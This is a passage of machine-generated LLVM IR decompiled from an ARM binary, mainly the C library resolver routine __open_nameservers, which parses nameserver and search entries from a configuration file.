  %v2_1bad412 = icmp eq i8 %v2_1bad010, 0
  store i1 %v2_1bad412, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bad412, label %dec_label_pc_1bb04, label %dec_label_pc_1bae0

dec_label_pc_1bae0:                               ; preds = %entry, %bb8.dec_label_pc_1bae0_crit_edge
  %v1_1bae0 = phi i32 [ %v1_1bae0.pre, %bb8.dec_label_pc_1bae0_crit_edge ], [ 744, %entry ]
  %v0_1bae0 = phi i32 [ %v0_1bae0.pre, %bb8.dec_label_pc_1bae0_crit_edge ], [ ptrtoint (i32* @global_var_28010.981 to i32), %entry ]
  %v2_1bad016 = phi i8 [ %v2_1bad0, %bb8.dec_label_pc_1bae0_crit_edge ], [ %v2_1bad010, %entry ]
  %v2_1bad817.in.in = phi i8 [ %v2_1bad0, %bb8.dec_label_pc_1bae0_crit_edge ], [ %v2_1bad010, %entry ]
  %v1_1bad015 = phi i8* [ %v1_1bad0, %bb8.dec_label_pc_1bae0_crit_edge ], [ %v1_1bad09, %entry ]
  %v2_1baf814 = phi i32 [ %v2_1bafc, %bb8.dec_label_pc_1bae0_crit_edge ], [ %v0_1bad0.pre, %entry ]
  %v2_1bad817.in = zext i8 %v2_1bad817.in.in to i32
  %v2_1bad817 = mul nuw nsw i32 %v2_1bad817.in, 2
  %v2_1bae0 = add i32 %v1_1bae0, %v0_1bae0
  %v3_1bae0 = inttoptr i32 %v2_1bae0 to i32*
  %v4_1bae0 = load i32, i32* %v3_1bae0, align 4
  %v2_1bae4 = add i32 %v4_1bae0, %v2_1bad817
  %v3_1bae4 = inttoptr i32 %v2_1bae4 to i16*
  %v4_1bae4 = load i16, i16* %v3_1bae4, align 2
  %v1_1bae8 = and i16 %v4_1bae4, 32
  %v2_1bae8 = icmp eq i16 %v1_1bae8, 0
  store i1 %v2_1bae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bae8, label %dec_label_pc_1bb04, label %dec_label_pc_1baf0

dec_label_pc_1baf0:                               ; preds = %dec_label_pc_1bae0
  %v7_1baf0 = icmp eq i8 %v2_1bad016, 35
  br i1 %v7_1baf0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1baf0
  %v8_1baf4 = icmp eq i8 %v2_1bad016, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_1baf0, %bb
  %storemerge = phi i1 [ %v8_1baf4, %bb ], [ %v7_1baf0, %dec_label_pc_1baf0 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_1baf8 = load i32, i32* %lr.global-to-local, align 4
  %v1_1baf8 = trunc i32 %v0_1baf8 to i8
  store i8 %v1_1baf8, i8* %v1_1bad015, align 1
  %v0_1bafc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1bb08.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1bafc, label %dec_label_pc_1bb04, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1bafc = add i32 %v1_1bb08.pre, 1
  store i32 %v2_1bafc, i32* %r0.global-to-local, align 4
  %v1_1bad0 = inttoptr i32 %v2_1bafc to i8*
  %v2_1bad0 = load i8, i8* %v1_1bad0, align 1
  %v2_1bad4 = icmp eq i8 %v2_1bad0, 0
  store i1 %v2_1bad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bad4, label %dec_label_pc_1bb04, label %bb8.dec_label_pc_1bae0_crit_edge

bb8.dec_label_pc_1bae0_crit_edge:                 ; preds = %bb8
  %v0_1bae0.pre = load i32, i32* @ip, align 4
  %v1_1bae0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1bae0

dec_label_pc_1bb04:                               ; preds = %bb8, %dec_label_pc_1bae0, %bb7, %entry
  %v1_1bb08 = phi i32 [ %v0_1bad0.pre, %entry ], [ %v1_1bb08.pre, %bb7 ], [ %v2_1baf814, %dec_label_pc_1bae0 ], [ %v2_1bafc, %bb8 ]
  %v2_1bb04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1bb04, i32* @r4, align 4
  ret i32 %v1_1bb08

; uselistorder directives
  uselistorder i8 %v2_1bad0, { 2, 1, 0 }
  uselistorder i8* %v1_1bad0, { 1, 0 }
  uselistorder i32 %v2_1bafc, { 0, 2, 3, 1 }
  uselistorder i1 %v2_1bae8, { 1, 0 }
  uselistorder i8 %v2_1bad016, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 744, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_1bb04, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_1bae0, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1bb14 = load i32, i32* @r4, align 4
  store i32 %v3_1bb14, i32* %stack_var_-36, align 4
  %v15_1bb14 = load i32, i32* @r8, align 4
  %v18_1bb14 = load i32, i32* @sb, align 4
  %v21_1bb14 = load i32, i32* @sl, align 4
  %v24_1bb14 = load i32, i32* @fp, align 4
  %v27_1bb14 = load i32, i32* @lr, align 4
  store i32 27556, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  %v4_1bb24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 27556) to i32*), align 4
  store i32 %v4_1bb24, i32* @r4, align 4
  %v2_1bb28 = icmp eq i32 %v4_1bb24, 0
  br i1 %v2_1bb28, label %dec_label_pc_1bb34, label %dec_label_pc_1bb64

dec_label_pc_1bb34:                               ; preds = %entry
  %v2_1bb38 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1bb38, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1304), i32* %r0.global-to-local, align 4
  %v2_1bb40 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1304), i32 %v2_1bb38)
  store i32 %v2_1bb40, i32* %r0.global-to-local, align 4
  %v2_1bb44 = icmp eq i32 %v2_1bb40, 0
  %v1_1bb48 = load i32, i32* @r4, align 4
  %.v1_1bb48 = select i1 %v2_1bb44, i32 %tmp38, i32 %v1_1bb48
  store i32 26552, i32* %r1.global-to-local, align 4
  store i32 %.v1_1bb48, i32* %r2.global-to-local, align 4
  %v0_1bb54 = load i32, i32* @r5, align 4
  %v2_1bb54 = add i32 %v0_1bb54, 26552
  %v3_1bb54 = inttoptr i32 %v2_1bb54 to i32*
  %v4_1bb54 = load i32, i32* %v3_1bb54, align 4
  store i32 %v4_1bb54, i32* %r3.global-to-local, align 4
  %v9_1bb58 = icmp eq i32 %v4_1bb54, %.v1_1bb48
  br i1 %v9_1bb58, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_1bb34
  store i32 %.v1_1bb48, i32* %v3_1bb54, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_1bb34, %bb
  store i32 113508, i32* @lr, align 4
  %v1_1bb60 = xor i1 %v9_1bb58, true
  call void @__pseudo_cond_branch(i1 %v1_1bb60, i32 ptrtoint (i32* @global_var_1bf70.1362 to i32))
  %v0_1bb68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1bb64

dec_label_pc_1bb64:                               ; preds = %entry, %bb58
  %v2_1bb7c = phi i32 [ ptrtoint (i32* @global_var_28010.981 to i32), %entry ], [ %v0_1bb68.pre, %bb58 ]
  store i32 27568, i32* %r3.global-to-local, align 4
  %v2_1bb68 = add i32 %v2_1bb7c, 27568
  %v3_1bb68 = inttoptr i32 %v2_1bb68 to i32*
  %v4_1bb68 = load i32, i32* %v3_1bb68, align 4
  store i32 %v4_1bb68, i32* %r3.global-to-local, align 4
  %v2_1bb6c = icmp eq i32 %v4_1bb68, 0
  br i1 %v2_1bb6c, label %dec_label_pc_1bb74, label %dec_label_pc_1bf08

dec_label_pc_1bb74:                               ; preds = %dec_label_pc_1bb64
  %v4_1bb7c = add i32 %v2_1bb7c, 1342
  %v5_1bb7c = inttoptr i32 %v4_1bb7c to i8*
  store i8 5, i8* %v5_1bb7c, align 1
  store i32 -1304, i32* %r0.global-to-local, align 4
  store i32 1343, i32* %r3.global-to-local, align 4
  store i32 -2276, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_1bb90 = load i32, i32* @r5, align 4
  %v4_1bb90 = add i32 %v2_1bb90, 1343
  %v5_1bb90 = inttoptr i32 %v4_1bb90 to i8*
  store i8 3, i8* %v5_1bb90, align 1
  %v0_1bb94 = load i32, i32* @r5, align 4
  %v1_1bb94 = load i32, i32* %r0.global-to-local, align 4
  %v2_1bb94 = add i32 %v1_1bb94, %v0_1bb94
  store i32 %v2_1bb94, i32* @r0, align 4
  %v1_1bb98 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bb98 = add i32 %v1_1bb98, %v0_1bb94
  store i32 %v2_1bb98, i32* @r1, align 4
  %v2_1bb9c = call i32 @__GI_fopen(i32 %v2_1bb94, i32 %v2_1bb98)
  store i32 %v2_1bb9c, i32* %r0.global-to-local, align 4
  store i32 %v2_1bb9c, i32* @fp, align 4
  %v2_1bba0 = icmp eq i32 %v2_1bb9c, 0
  br i1 %v2_1bba0, label %dec_label_pc_1be2c, label %dec_label_pc_1bdd4

dec_label_pc_1bbac:                               ; preds = %dec_label_pc_1bdd4, %dec_label_pc_1be08.backedge
  store i32 %v2_1be08, i32* %r0.global-to-local, align 4
  %v2_1bbb0 = call i32 @skip_and_NUL_space(i8* %v1_1bbb0)
  store i32 %v2_1bbb0, i32* %r0.global-to-local, align 4
  store i32 %v2_1bbb0, i32* @r4, align 4
  %v0_1bbb8 = call i32 @skip_nospace()
  store i32 %v0_1bbb8, i32* %r0.global-to-local, align 4
  %v1_1bbbc = inttoptr i32 %v0_1bbb8 to i8*
  %v2_1bbbc = call i32 @skip_and_NUL_space(i8* %v1_1bbbc)
  store i32 %v2_1bdd8, i32* @r1, align 4
  store i32 %v2_1bbbc, i32* @r7, align 4
  %v0_1bbc8 = load i32, i32* @r4, align 4
  store i32 %v0_1bbc8, i32* %r0.global-to-local, align 4
  %v2_1bbcc = inttoptr i32 %v0_1bbc8 to i8*
  %v3_1bbcc = call i32 @__GI_strcoll(i8* %v2_1bbcc, i32 %v2_1bdd8)
  store i32 %v3_1bbcc, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1bbcc, 16777216
  %v1_1bbd0 = sdiv i32 %sext, 16777216
  store i32 %v1_1bbd0, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1bbd8, label %dec_label_pc_1bc94

dec_label_pc_1bbd8:                               ; preds = %dec_label_pc_1bbac
  %v0_1bbd8 = load i32, i32* @r7, align 4
  store i32 %v0_1bbd8, i32* %r0.global-to-local, align 4
  %v0_1bbdc = call i32 @skip_nospace()
  %v1_1bbdc = inttoptr i32 %v0_1bbdc to i8*
  store i32 %v2_1bbe0, i32* @r4, align 4
  %v0_1bbe4 = load i32, i32* @r6, align 4
  %v1_1bbe4 = trunc i32 %v0_1bbe4 to i8
  store i8 %v1_1bbe4, i8* %v1_1bbdc, align 1
  %v0_1bbe8 = load i32, i32* @r6, align 4
  store i32 %v0_1bbe8, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_1bbe0, i32* %r0.global-to-local, align 4
  %v3_1bbf4 = call i32 @__GI_memset(i8* %v2_1bbf4, i32 %v0_1bbe8)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1bbfc = load i32, i32* @r7, align 4
  store i32 %v0_1bbfc, i32* %r1.global-to-local, align 4
  store i32 %v2_1bc00, i32* %r2.global-to-local, align 4
  %v3_1bc04 = inttoptr i32 %v0_1bbfc to i8*
  %v4_1bc04 = call i32 @inet_pton(i32 10, i8* %v3_1bc04, i32 %v2_1bc00)
  store i32 %v4_1bc04, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_1bc04, 1
  br i1 %tmp59, label %dec_label_pc_1bc14, label %dec_label_pc_1bc30

dec_label_pc_1bc14:                               ; preds = %dec_label_pc_1bbd8
  %v0_1bc14 = load i32, i32* @r7, align 4
  store i32 %v0_1bc14, i32* %r1.global-to-local, align 4
  store i32 %v2_1bc18, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_1bc20 = inttoptr i32 %v0_1bc14 to i8*
  %v4_1bc20 = call i32 @inet_pton(i32 2, i8* %v3_1bc20, i32 %v2_1bc18)
  store i32 %v4_1bc20, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_1bc20, 1
  br i1 %tmp60, label %dec_label_pc_1be08.backedge, label %dec_label_pc_1bc30

dec_label_pc_1bc30:                               ; preds = %dec_label_pc_1bc14, %dec_label_pc_1bbd8
  %v0_1bc34.off0 = phi i16 [ 10, %dec_label_pc_1bbd8 ], [ 2, %dec_label_pc_1bc14 ]
  store i32 %v2_1bc30, i32* %r2.global-to-local, align 4
  store i16 %v0_1bc34.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 27568, i32* @r7, align 4
  %v0_1bc44 = load i32, i32* @r5, align 4
  %v2_1bc44 = add i32 %v0_1bc44, 27568
  %v3_1bc44 = inttoptr i32 %v2_1bc44 to i32*
  %v4_1bc44 = load i32, i32* %v3_1bc44, align 4
  store i32 27564, i32* @sl, align 4
  %v1_1bc4c = add i32 %v4_1bc44, 1
  store i32 %v1_1bc4c, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1bc54 = mul i32 %v1_1bc4c, 28
  store i32 %v2_1bc54, i32* %r1.global-to-local, align 4
  %v2_1bc58 = add i32 %v0_1bc44, 27564
  %v3_1bc58 = inttoptr i32 %v2_1bc58 to i32*
  %v4_1bc58 = load i32, i32* %v3_1bc58, align 4
  store i32 %v4_1bc58, i32* %r0.global-to-local, align 4
  %v2_1bc5c = inttoptr i32 %v4_1bc58 to i32*
  %v3_1bc5c = call i32 @realloc(i32* %v2_1bc5c, i32 %v2_1bc54)
  store i32 %v3_1bc5c, i32* %r0.global-to-local, align 4
  store i32 %v3_1bc5c, i32* @r6, align 4
  %v2_1bc60 = icmp eq i32 %v3_1bc5c, 0
  br i1 %v2_1bc60, label %dec_label_pc_1be08.backedge, label %dec_label_pc_1bc68

dec_label_pc_1bc68:                               ; preds = %dec_label_pc_1bc30
  %v0_1bc68 = load i32, i32* @r5, align 4
  %v1_1bc68 = load i32, i32* @r7, align 4
  %v2_1bc68 = add i32 %v1_1bc68, %v0_1bc68
  %v3_1bc68 = inttoptr i32 %v2_1bc68 to i32*
  %v4_1bc68 = load i32, i32* %v3_1bc68, align 4
  store i32 %v4_1bc68, i32* %r4.global-to-local, align 4
  %v1_1bc6c = load i32, i32* @r8, align 4
  %v3_1bc6c = mul i32 %v1_1bc6c, %v4_1bc68
  %v4_1bc6c = add i32 %v3_1bc6c, %v3_1bc5c
  store i32 %v4_1bc6c, i32* %lr.global-to-local, align 4
  %v2_1bc74 = load i16, i16* %stack_var_-68, align 2
  %v3_1bc74 = sext i16 %v2_1bc74 to i32
  store i32 %v3_1bc74, i32* %r0.global-to-local, align 4
  %v6_1bc74 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1bc74, i32* %r1.global-to-local, align 4
  %v9_1bc74 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1bc74, i32* %r2.global-to-local, align 4
  store i32 %v14_1bc74, i32* @ip, align 4
  %v2_1bc78 = load i32, i32* @sl, align 4
  %v3_1bc78 = add i32 %v2_1bc78, %v0_1bc68
  %v4_1bc78 = inttoptr i32 %v3_1bc78 to i32*
  store i32 %v3_1bc5c, i32* %v4_1bc78, align 4
  %v0_1bc7c = load i32, i32* %lr.global-to-local, align 4
  %v1_1bc7c = inttoptr i32 %v0_1bc7c to i32*
  %v2_1bc7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1bc7c, i32* %v1_1bc7c, align 4
  %v3_1bc7c = add i32 %v0_1bc7c, 4
  %v4_1bc7c = inttoptr i32 %v3_1bc7c to i32*
  %v5_1bc7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1bc7c, i32* %v4_1bc7c, align 4
  %v6_1bc7c = add i32 %v0_1bc7c, 8
  %v7_1bc7c = inttoptr i32 %v6_1bc7c to i32*
  %v8_1bc7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1bc7c, i32* %v7_1bc7c, align 4
  %v9_1bc7c = add i32 %v0_1bc7c, 12
  %v10_1bc7c = inttoptr i32 %v9_1bc7c to i32*
  %v11_1bc7c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1bc7c, i32* %v10_1bc7c, align 4
  %v12_1bc7c = add i32 %v0_1bc7c, 16
  store i32 %v12_1bc7c, i32* @lr, align 4
  %v2_1bc80 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_1bc80, i32* %r0.global-to-local, align 4
  %v0_1bc84 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bc84 = add i32 %v0_1bc84, 1
  store i32 %v1_1bc84, i32* %r4.global-to-local, align 4
  %v1_1bc88 = inttoptr i32 %v12_1bc7c to i32*
  store i32 %v2_1bc80, i32* %v1_1bc88, align 4
  %v3_1bc88 = add i32 %v0_1bc7c, 20
  %v4_1bc88 = inttoptr i32 %v3_1bc88 to i32*
  %v5_1bc88 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1bc88, i32* %v4_1bc88, align 4
  %v6_1bc88 = add i32 %v0_1bc7c, 24
  %v7_1bc88 = inttoptr i32 %v6_1bc88 to i32*
  %v8_1bc88 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1bc88, i32* %v7_1bc88, align 4
  %v0_1bc8c = load i32, i32* %r4.global-to-local, align 4
  %v1_1bc8c = load i32, i32* @r5, align 4
  %v2_1bc8c = load i32, i32* @r7, align 4
  %v3_1bc8c = add i32 %v2_1bc8c, %v1_1bc8c
  %v4_1bc8c = inttoptr i32 %v3_1bc8c to i32*
  store i32 %v0_1bc8c, i32* %v4_1bc8c, align 4
  br label %dec_label_pc_1be08.backedge

dec_label_pc_1be08.backedge:                      ; preds = %dec_label_pc_1bd30, %dec_label_pc_1bd20, %dec_label_pc_1bcec, %dec_label_pc_1bc68, %dec_label_pc_1bdc0, %dec_label_pc_1bc14, %dec_label_pc_1bc30, %dec_label_pc_1bd68, %dec_label_pc_1bd70, %dec_label_pc_1bd54, %dec_label_pc_1bda4
  %v0_1be14.pre = load i32, i32* @fp, align 4
  store i32 %v2_1be08, i32* @r4, align 4
  store i32 %v2_1be08, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_1be14.pre, i32* %r2.global-to-local, align 4
  %v3_1be18 = call i32 @fgets(i32 %v2_1be08, i32 128, i32 %v0_1be14.pre)
  store i32 %v3_1be18, i32* %r0.global-to-local, align 4
  %v2_1be1c = icmp eq i32 %v3_1be18, 0
  br i1 %v2_1be1c, label %dec_label_pc_1be24, label %dec_label_pc_1bbac

dec_label_pc_1bc94:                               ; preds = %dec_label_pc_1bbac
  %v0_1bc94 = load i32, i32* @r4, align 4
  store i32 %v0_1bc94, i32* %r0.global-to-local, align 4
  store i32 %v2_1bde4, i32* @r1, align 4
  %v2_1bc9c = inttoptr i32 %v0_1bc94 to i8*
  %v3_1bc9c = call i32 @__GI_strcoll(i8* %v2_1bc9c, i32 %v2_1bde4)
  store i32 %v3_1bc9c, i32* %r0.global-to-local, align 4
  %v2_1bca0 = icmp eq i32 %v3_1bc9c, 0
  br i1 %v2_1bca0, label %dec_label_pc_1bcd4, label %dec_label_pc_1bca8

dec_label_pc_1bca8:                               ; preds = %dec_label_pc_1bc94
  %v0_1bca8 = load i32, i32* @r4, align 4
  store i32 %v0_1bca8, i32* %r0.global-to-local, align 4
  store i32 %v2_1bdf0, i32* @r1, align 4
  %v2_1bcb0 = inttoptr i32 %v0_1bca8 to i8*
  %v3_1bcb0 = call i32 @__GI_strcoll(i8* %v2_1bcb0, i32 %v2_1bdf0)
  store i32 %v3_1bcb0, i32* %r0.global-to-local, align 4
  %v2_1bcb4 = icmp eq i32 %v3_1bcb0, 0
  br i1 %v2_1bcb4, label %dec_label_pc_1bcd4, label %dec_label_pc_1bd54

dec_label_pc_1bcc0:                               ; preds = %dec_label_pc_1bcd4, %dec_label_pc_1bcc0.dec_label_pc_1bcc0_crit_edge
  %v2_1bcc4 = phi i32 [ %v1_1bcd8, %dec_label_pc_1bcc0.dec_label_pc_1bcc0_crit_edge ], [ %v1_1bcd810, %dec_label_pc_1bcd4 ]
  %v0_1bcc4 = phi i32 [ %v1_1bce0, %dec_label_pc_1bcc0.dec_label_pc_1bcc0_crit_edge ], [ %v1_1bce017, %dec_label_pc_1bcd4 ]
  %v1_1bcc0 = phi i32 [ %v1_1bcc0.pre, %dec_label_pc_1bcc0.dec_label_pc_1bcc0_crit_edge ], [ 27560, %dec_label_pc_1bcd4 ]
  %v1_1bcc4 = phi i32 [ %v0_1bcd8, %dec_label_pc_1bcc0.dec_label_pc_1bcc0_crit_edge ], [ %v0_1bcd89, %dec_label_pc_1bcd4 ]
  %v2_1bcc0 = add i32 %v1_1bcc4, %v1_1bcc0
  %v3_1bcc0 = inttoptr i32 %v2_1bcc0 to i32*
  %v4_1bcc0 = load i32, i32* %v3_1bcc0, align 4
  store i32 %v4_1bcc0, i32* %r3.global-to-local, align 4
  %v3_1bcc4 = add i32 %v1_1bcc4, %v2_1bcc4
  %v4_1bcc4 = inttoptr i32 %v3_1bcc4 to i32*
  store i32 %v0_1bcc4, i32* %v4_1bcc4, align 4
  %v0_1bcc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bcc8 = load i32, i32* %r2.global-to-local, align 4
  %v4_1bcc8 = mul i32 %v1_1bcc8, 4
  %v5_1bcc8 = add i32 %v4_1bcc8, %v0_1bcc8
  %v6_1bcc8 = inttoptr i32 %v5_1bcc8 to i32*
  %v7_1bcc8 = load i32, i32* %v6_1bcc8, align 4
  store i32 %v7_1bcc8, i32* @r0, align 4
  %v0_1bccc = call i32 @free()
  store i32 %v0_1bccc, i32* %r0.global-to-local, align 4
  %v0_1bcd8 = load i32, i32* @r5, align 4
  %v1_1bcd8 = load i32, i32* @sb, align 4
  %v2_1bcd8 = add i32 %v1_1bcd8, %v0_1bcd8
  %v3_1bcd8 = inttoptr i32 %v2_1bcd8 to i32*
  %v4_1bcd8 = load i32, i32* %v3_1bcd8, align 4
  store i32 %v4_1bcd8, i32* %r3.global-to-local, align 4
  %v2_1bcdc = icmp eq i32 %v4_1bcd8, 0
  %v1_1bce0 = add i32 %v4_1bcd8, -1
  store i32 %v1_1bce0, i32* %r2.global-to-local, align 4
  br i1 %v2_1bcdc, label %dec_label_pc_1bce8, label %dec_label_pc_1bcc0.dec_label_pc_1bcc0_crit_edge

dec_label_pc_1bcc0.dec_label_pc_1bcc0_crit_edge:  ; preds = %dec_label_pc_1bcc0
  %v1_1bcc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bcc0

dec_label_pc_1bcd4:                               ; preds = %dec_label_pc_1bca8, %dec_label_pc_1bc94
  store i32 27560, i32* @r4, align 4
  %v0_1bcd89 = load i32, i32* @r5, align 4
  %v1_1bcd810 = load i32, i32* @sb, align 4
  %v2_1bcd811 = add i32 %v1_1bcd810, %v0_1bcd89
  %v3_1bcd812 = inttoptr i32 %v2_1bcd811 to i32*
  %v4_1bcd813 = load i32, i32* %v3_1bcd812, align 4
  store i32 %v4_1bcd813, i32* %r3.global-to-local, align 4
  %v2_1bcdc15 = icmp eq i32 %v4_1bcd813, 0
  %v1_1bce017 = add i32 %v4_1bcd813, -1
  store i32 %v1_1bce017, i32* %r2.global-to-local, align 4
  br i1 %v2_1bcdc15, label %dec_label_pc_1bce8, label %dec_label_pc_1bcc0

dec_label_pc_1bce8:                               ; preds = %dec_label_pc_1bcc0, %dec_label_pc_1bcd4
  store i32 27560, i32* @r6, align 4
  br label %dec_label_pc_1bcec

dec_label_pc_1bcec:                               ; preds = %dec_label_pc_1bd30, %dec_label_pc_1bce8
  %v0_1bcec = load i32, i32* @r7, align 4
  store i32 %v0_1bcec, i32* %r0.global-to-local, align 4
  %v0_1bcf0 = call i32 @skip_nospace()
  store i32 %v0_1bcf0, i32* %r0.global-to-local, align 4
  %v1_1bcf4 = inttoptr i32 %v0_1bcf0 to i8*
  %v2_1bcf4 = call i32 @skip_and_NUL_space(i8* %v1_1bcf4)
  store i32 %v2_1bcf4, i32* %r0.global-to-local, align 4
  %v0_1bcf8 = load i32, i32* @r5, align 4
  %v1_1bcf8 = load i32, i32* @sb, align 4
  %v2_1bcf8 = add i32 %v1_1bcf8, %v0_1bcf8
  %v3_1bcf8 = inttoptr i32 %v2_1bcf8 to i32*
  %v4_1bcf8 = load i32, i32* %v3_1bcf8, align 4
  store i32 %v2_1bcf4, i32* @r4, align 4
  %tmp69 = mul i32 %v4_1bcf8, 4
  %v3_1bd04 = add i32 %tmp69, 4
  store i32 %v3_1bd04, i32* %r1.global-to-local, align 4
  %v1_1bd08 = load i32, i32* @r6, align 4
  %v2_1bd08 = add i32 %v1_1bd08, %v0_1bcf8
  %v3_1bd08 = inttoptr i32 %v2_1bd08 to i32*
  %v4_1bd08 = load i32, i32* %v3_1bd08, align 4
  store i32 %v4_1bd08, i32* %r0.global-to-local, align 4
  %v2_1bd0c = inttoptr i32 %v4_1bd08 to i32*
  %v3_1bd0c = call i32 @realloc(i32* %v2_1bd0c, i32 %v3_1bd04)
  store i32 %v3_1bd0c, i32* %r3.global-to-local, align 4
  %v2_1bd10 = icmp eq i32 %v3_1bd0c, 0
  %v0_1bd14 = load i32, i32* @r7, align 4
  store i32 %v0_1bd14, i32* %r0.global-to-local, align 4
  %v0_1bd18 = load i32, i32* @r4, align 4
  store i32 %v0_1bd18, i32* @r7, align 4
  br i1 %v2_1bd10, label %dec_label_pc_1be08.backedge, label %dec_label_pc_1bd20

dec_label_pc_1bd20:                               ; preds = %dec_label_pc_1bcec
  %v1_1bd20 = load i32, i32* @r5, align 4
  %v2_1bd20 = load i32, i32* @r6, align 4
  %v3_1bd20 = add i32 %v2_1bd20, %v1_1bd20
  %v4_1bd20 = inttoptr i32 %v3_1bd20 to i32*
  store i32 %v3_1bd0c, i32* %v4_1bd20, align 4
  %v1_1bd24 = inttoptr i32 %v0_1bd14 to i8*
  %v2_1bd24 = call i32 @__GI_strdup(i8* %v1_1bd24)
  store i32 %v2_1bd24, i32* %r0.global-to-local, align 4
  %v2_1bd28 = icmp eq i32 %v2_1bd24, 0
  br i1 %v2_1bd28, label %dec_label_pc_1be08.backedge, label %dec_label_pc_1bd30

dec_label_pc_1bd30:                               ; preds = %dec_label_pc_1bd20
  %v0_1bd30 = load i32, i32* @r5, align 4
  %v1_1bd30 = load i32, i32* @sb, align 4
  %v2_1bd30 = add i32 %v1_1bd30, %v0_1bd30
  %v3_1bd30 = inttoptr i32 %v2_1bd30 to i32*
  %v4_1bd30 = load i32, i32* %v3_1bd30, align 4
  store i32 %v4_1bd30, i32* %r3.global-to-local, align 4
  %v1_1bd34 = load i32, i32* @r6, align 4
  %v2_1bd34 = add i32 %v1_1bd34, %v0_1bd30
  %v3_1bd34 = inttoptr i32 %v2_1bd34 to i32*
  %v4_1bd34 = load i32, i32* %v3_1bd34, align 4
  store i32 %v4_1bd34, i32* %r2.global-to-local, align 4
  %v1_1bd38 = add i32 %v4_1bd30, 1
  store i32 %v1_1bd38, i32* %r1.global-to-local, align 4
  %v5_1bd3c = mul i32 %v4_1bd30, 4
  %v6_1bd3c = add i32 %v4_1bd34, %v5_1bd3c
  %v7_1bd3c = inttoptr i32 %v6_1bd3c to i32*
  store i32 %v2_1bd24, i32* %v7_1bd3c, align 4
  %v0_1bd40 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bd40 = load i32, i32* @r5, align 4
  %v2_1bd40 = load i32, i32* @sb, align 4
  %v3_1bd40 = add i32 %v2_1bd40, %v1_1bd40
  %v4_1bd40 = inttoptr i32 %v3_1bd40 to i32*
  store i32 %v0_1bd40, i32* %v4_1bd40, align 4
  %v0_1bd44 = load i32, i32* @r4, align 4
  %v1_1bd44 = inttoptr i32 %v0_1bd44 to i8*
  %v2_1bd44 = load i8, i8* %v1_1bd44, align 1
  %v3_1bd44 = zext i8 %v2_1bd44 to i32
  store i32 %v3_1bd44, i32* %r3.global-to-local, align 4
  %v2_1bd48 = icmp eq i8 %v2_1bd44, 0
